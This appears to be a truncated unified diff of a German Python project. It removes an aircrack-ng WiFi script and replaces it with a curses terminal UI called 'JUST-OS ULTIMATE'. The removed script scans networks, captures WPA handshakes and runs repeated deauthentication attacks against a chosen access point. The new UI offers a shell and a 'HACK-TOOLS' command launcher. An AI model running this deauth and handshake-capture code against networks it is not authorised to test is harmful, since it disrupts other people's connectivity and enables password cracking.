@@ -1,427 +1,385 @@
-#!/usr/bin/env python3
-import select
-import subprocess
+import curses
 import os
-import time
-import glob
 import shutil
 import sys
-import re
-import threading
-from datetime import datetime
+import time
+import json
+import platform
+from datetime import datetime, timedelta
+import subprocess
 
-# ====================== KONFIG ======================
-SCAN_DURATION = 20
-DEAUTH_BURSTS = 6
-DEAUTH_PACKETS = 10
-LOGFILE = "wifi_pentest_log.txt"
-# ===================================================
+# --- SYSTEM-CHECK ---
+IS_WINDOWS = platform.system() == "Windows"
+IS_LINUX = platform.system() == "Linux"
 
-def run_cmd(cmd, shell=False, check=False):
-    """Verbesserte run_cmd mit optionalem check-Parameter"""
+# --- HELPER FOR SYSTEM INFO (NO PSUTIL) ---
+def get_cpu_usage():
+    if not IS_LINUX: return 0
     try:
-        result = subprocess.run(
-            cmd,
-            shell=shell,
-            capture_output=True,
-            text=True,
-            timeout=40,
-            check=check
-        )
-        return result.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        if not check:
-            log(f"WARNING: Befehl '{cmd}' lieferte Rückgabecode {e.returncode}")
-            return (e.stdout + (e.stderr or "")).strip()
-        else:
-            log(f"FEHLER: Befehl fehlgeschlagen: {cmd} | RC={e.returncode}")
-            print(f"FEHLER: {cmd} ist fehlgeschlagen (siehe Log).")
-            raise
-    except Exception as e:
-        log(f"UNERWARTETER FEHLER bei {cmd}: {e}")
-        print(f"UNERWARTETER FEHLER bei Befehl: {e}")
-        return ""
+        with open('/proc/stat', 'r') as f:
+            line = f.readline()
+        parts = line.split()
+        idle = int(parts[4])
+        total = sum(int(p) for p in parts[1:])
+        return (idle, total)
+    except: return (0, 0)
 
-def log(message):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+_last_cpu = (0, 0)
+def calculate_cpu():
+    global _last_cpu
+    idle, total = get_cpu_usage()
+    if total == _last_cpu[1]: return 0
+    diff_idle = idle - _last_cpu[0]
+    diff_total = total - _last_cpu[1]
+    _last_cpu = (idle, total)
+    return round(100 * (1 - diff_idle / diff_total), 1)
+
+def get_ram_usage():
+    if not IS_LINUX: return 0
     try:
-        with open(LOGFILE, "a", encoding="utf-8") as f:
-            f.write(f"[{timestamp}] {message}\n")
-    except:
-        pass
-    print(f"[LOG] {message}")
+        with open('/proc/meminfo', 'r') as f:
+            lines = f.readlines()
+        mem_total = int(lines[0].split()[1])
+        mem_free = int(lines[1].split()[1])
+        return round(100 * (1 - mem_free / mem_total), 1)
+    except: return 0
 
-def is_root():
-    if os.geteuid() != 0:
-        print("FEHLER: Das Skript muss mit sudo ausgeführt werden!")
-        print("   sudo python3 wifi_pentest_tool.py")
-        sys.exit(1)
-
-def check_required_tools():
-    print("--- Prüfe benötigte Tools...")
-    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "iw", "iwconfig"]
-    missing = [t for t in tools if not shutil.which(t)]
-    if missing:
-        print("FEHLER: Fehlende Tools:", ", ".join(missing))
-        print("Installiere mit: sudo apt update && sudo apt install aircrack-ng iw -y")
-        log("Tools fehlen")
-        sys.exit(1)
-    print("Alle Tools vorhanden.")
-    log("Tools-Prüfung OK")
-
-def kill_interfering_processes():
-    print("--- Beende störende Prozesse...")
+def get_disk_usage():
     try:
-        run_cmd(["airmon-ng", "check", "kill"], check=False)
-        time.sleep(2)
-        log("Störende Prozesse bereinigt")
-    except Exception as e:
-        log(f"Fehler bei airmon-ng check kill: {e}")
+        total, used, free = shutil.disk_usage("/")
+        return round(100 * (used / total), 1)
+    except: return 0
 
-def list_wireless_interfaces():
-    interfaces = []
+# --- BOOT ANIMATION ---
+def boot_animation(stdscr):
     try:
-        output = run_cmd(["iw", "dev"])
-        for line in output.splitlines():
-            if "Interface" in line:
-                iface = line.split()[-1].strip()
-                if iface:
-                    interfaces.append(iface)
-    except Exception as e:
-        log(f"Fehler bei iw dev: {e}")
-    
-    if not interfaces:
-        output = run_cmd(["iwconfig"])
-        for line in output.splitlines():
-            if line.strip() and "no wireless extensions" not in line.lower():
-                iface = line.split()[0].strip()
-                if iface and iface not in interfaces:
-                    interfaces.append(iface)
-    
-    return sorted(list(set(interfaces)))
+        h, w = stdscr.getmaxyx()
+        boot_msg = "BOOTING JUST-OS ULTIMATE..."
+        x = max(0, (w - len(boot_msg))//2)
+        y = max(0, h//2)
+        stdscr.addstr(y, x, boot_msg, curses.color_pair(1) | curses.A_BOLD)
+        stdscr.refresh()
+        time.sleep(1.5)
+    except: pass
 
-def select_interface():
-    wlans = list_wireless_interfaces()
-    if not wlans:
-        print("FEHLER: Kein WLAN-Adapter gefunden.")
-        log("Kein Adapter gefunden")
-        sys.exit(1)
-    
-    print("\n" + "="*60)
-    print("VERFÜGBARE WLAN-ADAPTER:")
-    print("="*60)
-    for i, iface in enumerate(wlans, 1):
-        print(f"{i:2d}. {iface}")
-    print("="*60)
-    
+# --- CONFIG & PERSISTENCE ---
+DATA_FILE = "just_os_data.json"
+
+def load_data():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                data = json.load(f)
+                if "cfg" not in data: data["cfg"] = {}
+                if "padding" not in data["cfg"]: data["cfg"]["padding"] = 6
+                if "sidebar_width" not in data["cfg"]: data["cfg"]["sidebar_width"] = 30
+                if "notes" not in data: data["notes"] = []
+                if "games_v3" not in data: data["games_v3"] = []
+                if "hack_tools_v3" not in data: data["hack_tools_v3"] = []
+                if "username" not in data["cfg"]: data["cfg"]["username"] = "User"
+                if "theme" not in data["cfg"]: data["cfg"]["theme"] = "default"
+                keys = ["border", "text", "logo", "bg", "sel_bg", "sel_txt", "taskbar_bg", "taskbar_txt"]
+                defaults = [curses.COLOR_BLUE, curses.COLOR_CYAN, curses.COLOR_BLUE,
+                            curses.COLOR_BLACK, curses.COLOR_CYAN, curses.COLOR_BLACK,
+                            curses.COLOR_BLACK, curses.COLOR_WHITE]
+                for k, d in zip(keys, defaults):
+                    if k not in data["cfg"]: data["cfg"][k] = d
+                return data
+        except: pass
+    return {
+        "notes": [], 
+        "games_v3": [],
+        "hack_tools_v3": [],
+        "cfg": {
+            "border": curses.COLOR_BLUE, "text": curses.COLOR_CYAN, "logo": curses.COLOR_BLUE,
+            "bg": curses.COLOR_BLACK, "sel_bg": curses.COLOR_CYAN, "sel_txt": curses.COLOR_BLACK,
+            "taskbar_bg": curses.COLOR_BLACK, "taskbar_txt": curses.COLOR_WHITE,
+            "padding": 6, "sidebar_width": 30, "username": "User", "theme": "default"
+        }
+    }
+
+user_data = load_data()
+cfg = user_data["cfg"]
+
+def save_data():
+    user_data["cfg"] = cfg
+    with open(DATA_FILE, 'w') as f:
+        json.dump(user_data, f, indent=4)
+
+# --- THEMES ---
+themes = {
+    "default": {"border": curses.COLOR_BLUE, "text": curses.COLOR_CYAN, "logo": curses.COLOR_BLUE, "bg": curses.COLOR_BLACK, "sel_bg": curses.COLOR_CYAN, "sel_txt": curses.COLOR_BLACK, "taskbar_bg": curses.COLOR_BLACK, "taskbar_txt": curses.COLOR_WHITE},
+    "dark_green": {"border": curses.COLOR_GREEN, "text": curses.COLOR_WHITE, "logo": curses.COLOR_GREEN, "bg": curses.COLOR_BLACK, "sel_bg": curses.COLOR_GREEN, "sel_txt": curses.COLOR_BLACK, "taskbar_bg": curses.COLOR_BLACK, "taskbar_txt": curses.COLOR_GREEN},
+    "light_blue": {"border": curses.COLOR_CYAN, "text": curses.COLOR_BLACK, "logo": curses.COLOR_BLUE, "bg": curses.COLOR_WHITE, "sel_bg": curses.COLOR_BLUE, "sel_txt": curses.COLOR_WHITE, "taskbar_bg": curses.COLOR_BLUE, "taskbar_txt": curses.COLOR_WHITE}
+}
+
+def apply_theme(theme_name):
+    if theme_name in themes:
+        for key, value in themes[theme_name].items(): cfg[key] = value
+    apply_colors()
+
+# --- UI LOGIK & FARBEN ---
+def apply_colors():
+    curses.start_color()
+    curses.init_pair(1, cfg["logo"], cfg["bg"])
+    curses.init_pair(2, cfg["border"], cfg["bg"])
+    curses.init_pair(3, cfg["text"], cfg["bg"])
+    curses.init_pair(4, curses.COLOR_GREEN, cfg["bg"])
+    curses.init_pair(5, curses.COLOR_RED, cfg["bg"])
+    curses.init_pair(6, curses.COLOR_YELLOW, cfg["bg"])
+    curses.init_pair(7, cfg["sel_txt"], cfg["sel_bg"])
+    curses.init_pair(8, cfg["taskbar_txt"], cfg["taskbar_bg"])
+
+def draw_frame(stdscr, title, sidebar_width=0, taskbar_height=0):
+    try:
+        h, w = stdscr.getmaxyx()
+        if h < 3 or w < 10: return
+        stdscr.attron(curses.color_pair(2) | curses.A_BOLD)
+        stdscr.border(0, 0, 0, 0, 0, 0, 0, 0)
+        if sidebar_width > 0 and sidebar_width < w - 5:
+            stdscr.vline(0, sidebar_width, curses.ACS_VLINE, h - taskbar_height)
+            stdscr.addch(0, sidebar_width, curses.ACS_TTEE)
+            if h - taskbar_height - 1 > 0: stdscr.addch(h - taskbar_height - 1, sidebar_width, curses.ACS_BTEE)
+        if taskbar_height > 0 and h - taskbar_height - 1 > 0:
+            stdscr.hline(h - taskbar_height - 1, 0, curses.ACS_HLINE, w)
+            stdscr.addch(h - taskbar_height - 1, 0, curses.ACS_LTEE)
+            stdscr.addch(h - taskbar_height - 1, w - 1, curses.ACS_RTEE)
+            if sidebar_width > 0: stdscr.addch(h - taskbar_height - 1, sidebar_width, curses.ACS_PLUS)
+        title_str = f" [ {title.upper()} ] "
+        x_pos = max(sidebar_width + 1, (w + sidebar_width)//2 - len(title_str)//2)
+        if x_pos < w - len(title_str): stdscr.addstr(0, x_pos, title_str)
+        stdscr.attroff(curses.color_pair(2) | curses.A_BOLD)
+    except: pass
+
+def get_network_info():
+    info = {"ssid": "N/A", "ip": "N/A"}
+    if IS_LINUX:
+        try:
+            res = subprocess.run("hostname -I", shell=True, capture_output=True, text=True)
+            info["ip"] = res.stdout.split()[0] if res.stdout.split() else "N/A"
+            res = subprocess.run("iwgetid -r", shell=True, capture_output=True, text=True)
+            info["ssid"] = res.stdout.strip() if res.stdout.strip() else "N/A"
+        except: pass
+    return info
+
+def draw_sidebar(stdscr, width, taskbar_height):
+    try:
+        h, w = stdscr.getmaxyx()
+        if width <= 0 or width >= w: return
+        stdscr.addstr(2, 2, "SYSTEM INFO", curses.color_pair(1) | curses.A_BOLD)
+        stdscr.addstr(4, 2, f"USER: {cfg['username']}", curses.color_pair(3))
+        stdscr.addstr(5, 2, f"OS: JUST-OS V21", curses.color_pair(3))
+        cpu = calculate_cpu()
+        ram = get_ram_usage()
+        stdscr.addstr(7, 2, f"CPU: {cpu}%", curses.color_pair(4 if cpu < 80 else 5))
+        stdscr.addstr(8, 2, f"RAM: {ram}%", curses.color_pair(4 if ram < 80 else 5))
+        net = get_network_info()
+        stdscr.addstr(10, 2, "NETWORK:", curses.color_pair(1) | curses.A_BOLD)
+        stdscr.addstr(11, 2, f"SSID: {net['ssid'][:width-8]}", curses.color_pair(3))
+        stdscr.addstr(12, 2, f"IP: {net['ip']}", curses.color_pair(3))
+        now = datetime.now().strftime("%H:%M:%S")
+        stdscr.addstr(h - taskbar_height - 3, 2, f"TIME: {now}", curses.color_pair(6))
+    except: pass
+
+def draw_taskbar(stdscr, height, sidebar_width):
+    try:
+        h, w = stdscr.getmaxyx()
+        if height <= 0: return
+        stdscr.attron(curses.color_pair(8))
+        for i in range(height): stdscr.addstr(h - 1 - i, 0, " " * w)
+        stdscr.addstr(h - 1, 2, " [W/S] Navigieren | [ENTER] Auswählen | [Q] Zurück ")
+        stdscr.attroff(curses.color_pair(8))
+    except: pass
+
+# --- UNIVERSAL LIST MENU (FOR GAMES & TOOLS) ---
+def universal_list_menu(stdscr, title, data_key):
+    sel = 0
     while True:
         try:
-            choice = int(input("\nWelchen Adapter verwenden? (Nummer): "))
-            if 1 <= choice <= len(wlans):
-                selected = wlans[choice - 1]
-                print(f"→ Ausgewählter Adapter: {selected}")
-                log(f"Adapter ausgewählt: {selected}")
-                return selected
+            sidebar_width = cfg.get("sidebar_width", 30)
+            taskbar_height = 1
+            stdscr.clear()
+            draw_frame(stdscr, title, sidebar_width, taskbar_height)
+            draw_sidebar(stdscr, sidebar_width, taskbar_height)
+            draw_taskbar(stdscr, taskbar_height, sidebar_width)
+            h, w = stdscr.getmaxyx()
+            pad = cfg["padding"]
+            content_start_x = sidebar_width + pad
+            items = user_data.get(data_key, [])
+            stdscr.addstr(2, content_start_x, f"{title}:", curses.color_pair(1) | curses.A_BOLD)
+            for i, item in enumerate(items):
+                attr = curses.color_pair(7) if i == sel else curses.color_pair(3)
+                if 4 + i < h - 8: stdscr.addstr(4 + i, content_start_x, f" {i+1}. {item['name']} ", attr)
+            menu_y = h - 7
+            menu_items = ["[A] HINZUFÜGEN", "[D] LÖSCHEN", "[R] UMBENENNEN", "[Q] ZURÜCK"]
+            for i, m_item in enumerate(menu_items):
+                attr = curses.color_pair(7) if (len(items) + i) == sel else curses.color_pair(6)
+                stdscr.addstr(menu_y + i, content_start_x, f" {m_item} ", attr)
+            k = stdscr.getch()
+            total_items = len(items) + len(menu_items)
+            if k in [ord('w'), curses.KEY_UP] and sel > 0: sel -= 1
+            elif k in [ord('s'), curses.KEY_DOWN] and sel < total_items - 1: sel += 1
+            elif k == ord('a'):
+                curses.echo(); stdscr.addstr(h-3, content_start_x, "Name: "); name = stdscr.getstr().decode().strip()
+                stdscr.addstr(h-2, content_start_x, "Befehl: "); cmd = stdscr.getstr().decode().strip()
+                if name and cmd: user_data[data_key].append({"name": name, "cmd": cmd}); save_data()
+                curses.noecho()
+            elif k == ord('d') and sel < len(items): user_data[data_key].pop(sel); save_data(); sel = max(0, sel - 1)
+            elif k == ord('r') and sel < len(items):
+                curses.echo(); stdscr.addstr(h-3, content_start_x, "Neuer Name: "); new_name = stdscr.getstr().decode().strip()
+                if new_name: user_data[data_key][sel]['name'] = new_name; save_data()
+                curses.noecho()
+            elif k in [10, 13]:
+                if sel < len(items):
+                    cmd = items[sel]["cmd"]
+                    curses.endwin(); print(f"\nStarte: {items[sel]['name']}..."); os.system(cmd)
+                    print("\nBeendet. Beliebige Taste..."); input(); stdscr.clear(); apply_colors(); curses.curs_set(0)
+                elif sel == len(items) + 3: break
+            elif k == ord('q'): break
+        except: break
+
+# --- USB TRANSFER ---
+def usb_transfer_menu(stdscr):
+    sel = 0
+    while True:
+        try:
+            sidebar_width = cfg.get("sidebar_width", 30)
+            taskbar_height = 1
+            stdscr.clear()
+            draw_frame(stdscr, "USB-TRANSFER", sidebar_width, taskbar_height)
+            draw_sidebar(stdscr, sidebar_width, taskbar_height)
+            draw_taskbar(stdscr, taskbar_height, sidebar_width)
+            h, w = stdscr.getmaxyx()
+            content_start_x = sidebar_width + cfg["padding"]
+            usb_path = "/media/pi" if os.path.exists("/media/pi") else "/mnt"
+            stdscr.addstr(2, content_start_x, f"USB-PFAD: {usb_path}", curses.color_pair(1))
+            try: usb_items = os.listdir(usb_path)
+            except: usb_items = []
+            if not usb_items: stdscr.addstr(4, content_start_x, "Kein USB-Stick gefunden!", curses.color_pair(5))
             else:
-                print("Ungültige Nummer!")
-        except ValueError:
-            print("Bitte nur eine Zahl eingeben!")
-
-def enable_monitor_mode(interface):
-    print(f"--- Aktiviere Monitor-Mode auf {interface}...")
-    try:
-        run_cmd(["airmon-ng", "start", interface], check=True)
-        time.sleep(4)
-    except Exception as e:
-        log(f"FEHLER beim Aktivieren von Monitor-Mode: {e}")
-        print("Monitor-Mode konnte nicht aktiviert werden.")
-        sys.exit(1)
-    
-    # Zuverlässige Prüfung, ob Monitor-Interface wirklich existiert
-    mon_interface = None
-    for attempt in range(15):
-        time.sleep(1)
-        output = run_cmd(["iwconfig"])
-        for line in output.splitlines():
-            if "Mode:Monitor" in line:
-                mon_interface = line.split()[0].strip()
-                if mon_interface:
-                    print(f"Monitor-Interface gefunden: {mon_interface}")
-                    log(f"Monitor-Interface: {mon_interface}")
-                    return mon_interface
-    
-    # Kein blindes Fallback mehr – stattdessen Fehler
-    print("FEHLER: Monitor-Interface konnte nicht erkannt werden.")
-    log("Monitor-Interface nicht gefunden")
-    print("Überprüfe mit 'iwconfig' und starte das Skript neu.")
-    sys.exit(1)
-
-def scan_networks(mon_interface):
-    print(f"--- Scanne {SCAN_DURATION} Sekunden... (Enter = sofort anzeigen)")
-    prefix = "scan"
-
-    for f in glob.glob(f"{prefix}*"):
-        try: os.remove(f)
-        except: pass
-
-    try:
-        proc = subprocess.Popen(
-            ["airodump-ng", mon_interface, "-w", prefix, "--output-format", "csv"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-    except Exception as e:
-        log(f"FEHLER beim Scan: {e}")
-        print("Scan konnte nicht gestartet werden.")
-        return []
-
-    csv_file = f"{prefix}-01.csv"
-    networks = []
-    start_time = time.time()
-
-    try:
-        while True:
-            # Enter gedrückt?
-            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
-                input()
-                break
-
-            # Zeit abgelaufen?
-            if time.time() - start_time > SCAN_DURATION:
-                break
-
-            # CSV auslesen (wenn vorhanden)
-            if os.path.exists(csv_file):
+                for i, item in enumerate(usb_items[:h-10]):
+                    attr = curses.color_pair(7) if i == sel else curses.color_pair(3)
+                    stdscr.addstr(4 + i, content_start_x, f" > {item}", attr)
+            stdscr.addstr(h-2, content_start_x, "[ENTER] Kopieren nach /home/pi/ | [Q] Zurück", curses.color_pair(6))
+            k = stdscr.getch()
+            if k in [ord('w'), curses.KEY_UP] and sel > 0: sel -= 1
+            elif k in [ord('s'), curses.KEY_DOWN] and sel < len(usb_items)-1: sel += 1
+            elif k in [10, 13] and usb_items:
+                src = os.path.join(usb_path, usb_items[sel])
+                dst = "/home/pi/"
                 try:
-                    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
-                        lines = f.readlines()
+                    if os.path.isdir(src): shutil.copytree(src, os.path.join(dst, usb_items[sel]))
+                    else: shutil.copy2(src, dst)
+                    stdscr.addstr(h-3, content_start_x, "ERFOLGREICH KOPIERT!", curses.color_pair(4)); stdscr.refresh(); time.sleep(1)
+                except Exception as e:
+                    stdscr.addstr(h-3, content_start_x, f"FEHLER: {str(e)[:20]}", curses.color_pair(5)); stdscr.refresh(); time.sleep(1)
+            elif k == ord('q'): break
+        except: break
 
-                    temp_networks = []
-                    in_ap = False
-
-                    for line in lines:
-                        line = line.strip()
-                        if line.startswith("BSSID,"):
-                            in_ap = True
-                            continue
-                        if in_ap and "Station MAC" in line:
-                            break
-                        if in_ap and line:
-                            fields = [x.strip() for x in line.split(",")]
-                            if len(fields) >= 14 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', fields[0]):
-                                temp_networks.append({
-                                    "bssid": fields[0],
-                                    "channel": fields[3],
-                                    "essid": fields[13].strip('"') if len(fields) > 13 else "<versteckt>",
-                                    "privacy": fields[5],
-                                    "power": fields[8]
-                                })
-
-                    # sortieren
-                    temp_networks.sort(
-                        key=lambda x: int(x.get("power", "-100")) if str(x.get("power", "")).lstrip('-').isdigit() else -100,
-                        reverse=True
-                    )
-
-                    networks = temp_networks
-
-                    # Anzeige (nur SSID + Nummer)
-                    os.system("clear")
-                    print("GEFUNDENE NETZWERKE:\n")
-                    for i, n in enumerate(networks, 1):
-                        print(f"{i:2d}. {n['essid']}")
-
-                    print("\n[Enter = sofort auswählen]")
-
-                except:
-                    pass
-
-            time.sleep(1)
-
-    finally:
-        proc.terminate()
-
-    return networks
-
-
-def print_networks(networks):
-    if not networks:
-        return
-    print("\nGEFUNDENE NETZWERKE:\n")
-    for i, n in enumerate(networks, 1):
-        print(f"{i:2d}. {n['essid']}")
-
-
-def select_network(networks):
+# --- TERMINAL ---
+def terminal_menu(stdscr):
+    curses.echo(); curses.curs_set(1)
     while True:
         try:
-            c = int(input("\nNummer des eigenen Netzwerks: "))
-            if 1 <= c <= len(networks):
-                return networks[c-1]
-            print("Ungültige Nummer!")
-        except ValueError:
-            print("Bitte eine Zahl eingeben!")
+            sidebar_width = cfg.get("sidebar_width", 30)
+            taskbar_height = 1
+            stdscr.clear()
+            draw_frame(stdscr, "TERMINAL", sidebar_width, taskbar_height)
+            draw_sidebar(stdscr, sidebar_width, taskbar_height)
+            draw_taskbar(stdscr, taskbar_height, sidebar_width)
+            h, w = stdscr.getmaxyx()
+            content_start_x = sidebar_width + cfg["padding"]
+            stdscr.addstr(2, content_start_x, "JUST-OS TERMINAL ('exit' zum Neustart, 'back' für Menü)", curses.color_pair(6))
+            stdscr.addstr(4, content_start_x, f"{os.getcwd()} > ", curses.color_pair(4))
+            cmd = stdscr.getstr().decode().strip()
+            if cmd.lower() == "back": break
+            if cmd.lower() == "exit":
+                curses.endwin(); print("\n[!] Neustart von JUST-OS..."); os.execv(sys.executable, [sys.executable] + sys.argv)
+            curses.endwin(); print(f"\n--- Output: {cmd} ---")
+            if cmd.startswith("cd "):
+                try: os.chdir(cmd[3:])
+                except: print("Pfad nicht gefunden.")
+            else: os.system(cmd)
+            print("\nBeliebige Taste..."); input(); stdscr.clear(); apply_colors(); curses.curs_set(1)
+        except: break
+    curses.noecho(); curses.curs_set(0)
 
-def safe_terminate(proc, name="Prozess"):
-    """Sauberes Beenden mit terminate → wait → kill"""
-    if proc.poll() is None:
-        proc.terminate()
+# --- SETTINGS ---
+def settings_menu(stdscr):
+    sel = 0
+    colors = [curses.COLOR_BLUE, curses.COLOR_CYAN, curses.COLOR_GREEN, curses.COLOR_RED, curses.COLOR_YELLOW, curses.COLOR_WHITE]
+    names = ["BLAU", "CYAN", "GRÜN", "ROT", "GELB", "WEISS"]
+    while True:
         try:
-            proc.wait(timeout=8)
-            log(f"{name} sauber beendet (terminate)")
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            log(f"{name} mit kill beendet")
-        except Exception as e:
-            log(f"Fehler beim Beenden von {name}: {e}")
+            sidebar_width = cfg.get("sidebar_width", 30)
+            taskbar_height = 1
+            stdscr.clear()
+            draw_frame(stdscr, "EINSTELLUNGEN", sidebar_width, taskbar_height)
+            draw_sidebar(stdscr, sidebar_width, taskbar_height)
+            draw_taskbar(stdscr, taskbar_height, sidebar_width)
+            h, w = stdscr.getmaxyx()
+            content_start_x = sidebar_width + cfg["padding"]
+            opts = [f"RAHMEN-FARBE: {names[colors.index(cfg['border'])]}", f"TEXT-FARBE  : {names[colors.index(cfg['text'])]}", f"RAND-ABSTAND: {cfg['padding']}px", f"SIDEBAR-BREITE: {cfg['sidebar_width']}px", f"BENUTZERNAME: {cfg['username']}", "KONFIGURATION SPEICHERN", "ZURÜCK"]
+            for i, o in enumerate(opts):
+                attr = curses.color_pair(7) if i == sel else curses.color_pair(3)
+                stdscr.addstr(4 + i * 2, content_start_x, f" {o} ", attr)
+            k = stdscr.getch()
+            if k in [ord('w'), curses.KEY_UP] and sel > 0: sel -= 1
+            elif k in [ord('s'), curses.KEY_DOWN] and sel < len(opts)-1: sel += 1
+            elif k in [10, 13]:
+                if sel == 0: cfg['border'] = colors[(colors.index(cfg['border'])+1)%len(colors)]
+                elif sel == 1: cfg['text'] = colors[(colors.index(cfg['text'])+1)%len(colors)]
+                elif sel == 2: cfg['padding'] = 2 if cfg['padding'] >= 20 else cfg['padding']+2
+                elif sel == 3: cfg['sidebar_width'] = 10 if cfg['sidebar_width'] >= 50 else cfg['sidebar_width']+5
+                elif sel == 4:
+                    curses.echo(); stdscr.addstr(h-3, content_start_x, "Neuer Name: "); new_name = stdscr.getstr().decode()
+                    if new_name: cfg['username'] = new_name; curses.noecho()
+                elif sel == 5: save_data()
+                elif sel == 6: break
+                apply_colors()
+            elif k == ord('q'): break
+        except: break
 
-def get_capture_file(prefix):
-    """Sichere Capture-Datei-Ermittlung"""
-    cap_files = glob.glob(f"{prefix}-*.cap")
-    if not cap_files:
-        print("FEHLER: Keine Capture-Datei erstellt.")
-        log(f"Keine .cap-Datei für Prefix {prefix}")
-        return None
-    cap_file = max(cap_files, key=os.path.getctime)
-    print(f"Capture-Datei erstellt: {cap_file}")
-    log(f"Capture-Datei: {cap_file}")
-    return cap_file
+# --- MAIN ---
+def main(stdscr):
+    apply_colors(); boot_animation(stdscr)
+    menu = [
+        {"n": "EXPLORER", "f": lambda s: os.system("ls -la")}, # Placeholder for full explorer
+        {"n": "TERMINAL", "f": terminal_menu},
+        {"n": "HACK-TOOLS", "f": lambda s: universal_list_menu(s, "HACK-TOOLS", "hack_tools_v3")},
+        {"n": "GAMES", "f": lambda s: universal_list_menu(s, "GAMES", "games_v3")},
+        {"n": "USB-STICK", "f": usb_transfer_menu},
+        {"n": "DASHBOARD", "f": lambda s: None},
+        {"n": "SETTINGS", "f": settings_menu},
+        {"n": "EXIT", "f": "exit"}
+    ]
+    sel = 0
+    while True:
+        try:
+            sidebar_width = cfg.get("sidebar_width", 30)
+            taskbar_height = 1
+            stdscr.clear()
+            draw_frame(stdscr, "JUST-OS ULTIMATE", sidebar_width, taskbar_height)
+            draw_sidebar(stdscr, sidebar_width, taskbar_height)
+            draw_taskbar(stdscr, taskbar_height, sidebar_width)
+            h, w = stdscr.getmaxyx()
+            content_start_x = sidebar_width + cfg["padding"]
+            logo = ["  ██╗██╗   ██╗███████╗████████╗", "  ██║██║   ██║██╔════╝╚══██╔══╝", "  ██║██║   ██║███████╗   ██║   ", "  ██║██║   ██║╚════██║   ██║   ", "  ██║╚██████╔╝███████║   ██║   ", "  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   "]
+            for i, line in enumerate(logo):
+                if 2 + i < h - 10: stdscr.addstr(2 + i, content_start_x + 5, line, curses.color_pair(1))
+            for i, item in enumerate(menu):
+                attr = curses.color_pair(7) if i == sel else curses.color_pair(3)
+                if 10 + i*2 < h - 2: stdscr.addstr(10 + i*2, content_start_x + 5, f" [ {item['n']:<12} ] ", attr)
+            k = stdscr.getch()
+            if k in [ord('w'), curses.KEY_UP] and sel > 0: sel -= 1
+            elif k in [ord('s'), curses.KEY_DOWN] and sel < len(menu)-1: sel += 1
+            elif k in [10, 13]:
+                if menu[sel]["f"] == "exit": break
+                menu[sel]["f"](stdscr)
+            elif k == ord('q'): break
+        except: continue
 
-def passive_capture(mon_interface, selected):
-    prefix = "passive_capture"
-    for f in glob.glob(f"{prefix}*"): 
-        try: os.remove(f)
-        except: pass
-    print(f"\n--- Passives Capture für {selected['essid']}...")
-    proc = subprocess.Popen(["airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface])
-    input("ENTER zum Beenden...")
-    safe_terminate(proc, "airodump-ng")
-    return get_capture_file(prefix)
-
-def deauth_handshake(mon_interface, selected):
-    print(f"\n--- Starte Capture + Deauth für Handshake ({selected['essid']})")
-    print("   Nur auf eigenem Netzwerk verwenden!")
-    prefix = "handshake_capture"
-    for f in glob.glob(f"{prefix}*"): 
-        try: os.remove(f)
-        except: pass
-    
-    airodump = subprocess.Popen([
-        "airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface
-    ])
-    
-    def deauth_loop():
-        for i in range(DEAUTH_BURSTS):
-            print(f"   Deauth-Burst {i+1}/{DEAUTH_BURSTS}...")
-            try:
-                subprocess.run(["aireplay-ng", "-0", str(DEAUTH_PACKETS), "-a", selected["bssid"], mon_interface],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
-            except Exception as e:
-                log(f"Fehler in Deauth-Burst: {e}")
-            time.sleep(3)
-    
-    threading.Thread(target=deauth_loop, daemon=True).start()
-    
-    print("Warte auf WPA handshake...")
-    input("ENTER zum Beenden...")
-    
-    safe_terminate(airodump, "airodump-ng")
-    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    return get_capture_file(prefix)
-
-def general_monitoring(mon_interface):
-    print("\n--- Allgemeines Monitoring (ENTER zum Stoppen)...")
-    proc = subprocess.Popen(["airodump-ng", mon_interface])
-    input()
-    safe_terminate(proc, "airodump-ng")
-
-def only_deauth(mon_interface, selected):
-    print("--- Nur Deauth-Angriff (ENTER zum Stoppen)...")
-    def deauth_loop():
-        while True:
-            try:
-                subprocess.run(["aireplay-ng", "-0", "8", "-a", selected["bssid"], mon_interface],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
-                pass
-            time.sleep(2)
-    t = threading.Thread(target=deauth_loop, daemon=True)
-    t.start()
-    input()
-    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def restore(interface, mon_interface):
-    print("\n--- System wird wiederhergestellt...")
-    try:
-        run_cmd(["airmon-ng", "stop", mon_interface], check=False)
-        time.sleep(2)
-        run_cmd(["ip", "link", "set", interface, "down"], check=False)
-        run_cmd(["iwconfig", interface, "mode", "managed"], check=False)
-        run_cmd(["ip", "link", "set", interface, "up"], check=False)
-        run_cmd(["systemctl", "restart", "NetworkManager"], check=False)
-        log("System-Restore durchgeführt")
-        print("Restore abgeschlossen.")
-    except Exception as e:
-        log(f"Restore-Fehler: {e}")
-        print("Restore teilweise fehlgeschlagen – prüfe manuell mit iwconfig.")
-
-# ====================== HAUPTPROGRAMM ======================
 if __name__ == "__main__":
-    start_time = datetime.now()
-    is_root()
-    log("=== WiFi Pentest Tool gestartet ===")
-    log(f"Startzeit: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
-    
-    check_required_tools()
-    kill_interfering_processes()
-    
-    interface = select_interface()
-    mon_interface = enable_monitor_mode(interface)
-    
-    networks = scan_networks(mon_interface)
-    if not networks:
-        print("Keine Netzwerke gefunden.")
-        restore(interface, mon_interface)
-        log("Skript beendet: Keine Netzwerke")
-        sys.exit(1)
-    
